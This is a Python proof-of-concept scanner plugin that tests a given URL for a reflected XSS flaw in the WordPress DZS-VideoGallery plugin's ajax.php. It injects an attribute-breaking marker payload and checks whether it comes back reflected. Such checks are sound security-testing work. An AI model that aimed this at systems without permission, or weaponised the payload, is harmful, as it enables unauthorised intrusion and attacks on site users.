#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import random
import requests
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "WordPress DZS-VideoGallery XSS",
        "desc": "WordPress DZS-VideoGallery /ajax.php 存在反射型XSS漏洞",
        "grade": "高",
        "type": "web",
        "keyword": "tag:wordpress"
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg
        }
    rand_str = str(random.randint(200000000, 210000000))
    try:
        r = requests.get(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/wp-content/plugins/dzs-videogallery/ajax.php?ajax=true&height=400&width=610&type=vimeo&source=\"/><test>test({rand_str})</test>', 
            headers=headers,
            timeout=timeout, 
            verify=False
            )
        if r.status_code == 200 and f"<test>test({rand_str})</test>" in r.text:
            return True
        else:
            return False
    except Exception as e:
        return 


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

